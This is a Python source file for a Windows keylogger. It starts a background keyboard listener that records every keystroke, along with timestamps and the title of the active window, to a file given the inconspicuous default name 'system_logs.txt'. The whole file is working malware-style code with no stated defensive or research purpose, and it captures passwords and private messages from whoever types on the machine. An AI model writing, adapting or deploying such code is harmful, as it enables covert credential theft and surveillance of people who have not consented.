import os
import ctypes
from datetime import datetime
from pynput import keyboard
from dotenv import load_dotenv

load_dotenv()
LOG_FILE = os.getenv("LOG_FILE", "system_logs.txt")

def get_active_window_title() -> str:

    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
    
    return buff.value if buff.value else "Unknown Window"

def start_keylogger() -> None:

    current_window = ""

    def on_press(key):
        nonlocal current_window
        
        try:

            active_window = get_active_window_title()
            

            if active_window != current_window:
                current_window = active_window
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                with open(LOG_FILE, "a", encoding="utf-8") as f:

                    f.write(f"\n\n[{timestamp}] [Window: {current_window}]\n")
        except Exception:
            pass


        k = ""
        
        if hasattr(key, 'char') and key.char is not None:
            k = key.char
        else:

            if key == keyboard.Key.space:
                k = " "
            elif key == keyboard.Key.enter:
                k = "[ENTER]\n"
            elif key == keyboard.Key.tab:
                k = "[TAB]\t"
            elif key == keyboard.Key.backspace:
                k = "[BACKSPACE]"
            else:

                k = f"[{str(key).replace('Key.', '').upper()}]"


        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(k)
            
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()